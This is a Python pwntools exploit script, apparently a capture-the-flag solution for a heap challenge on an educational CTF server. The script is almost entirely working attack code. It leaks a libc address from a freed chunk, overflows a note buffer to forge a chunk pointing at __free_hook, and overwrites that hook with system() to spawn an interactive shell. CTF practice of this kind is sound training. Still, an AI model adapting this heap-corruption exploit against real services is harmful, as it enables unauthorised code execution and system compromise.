from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

def add( idx, name ):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("note name\n> ")
    p.sendline( name )

def edit( idx, size, data ):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("size\n> ")
    p.sendline( str( size ) )
    p.sendline( data )

def delete( idx ):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )

def show():
    p.recvuntil('> ')
    p.sendline('4')

p = remote( 'edu-ctf.zoolab.org', 10007 )

add( 0, b'A' * 8 )
edit( 0, 0x418, b'A' )

add( 1, b'B' * 8 )
edit( 1, 0x18, b'B' )

add( 2, b'C' * 8 )

delete( 0 )
show()

p.recvuntil('data: ')
libc = u64( p.recv(6).ljust( 8, b'\x00' ) ) - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290
info( f'libc: {hex(libc)}' )

fake_chunk = flat(
    0, 0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook,
)

data = b"/bin/sh\x00".ljust( 0x10, b'B' )
edit( 1, 0x38, data + fake_chunk )
edit( 2, 0x8, p64( system ) )

delete( 1 )

p.interactive()
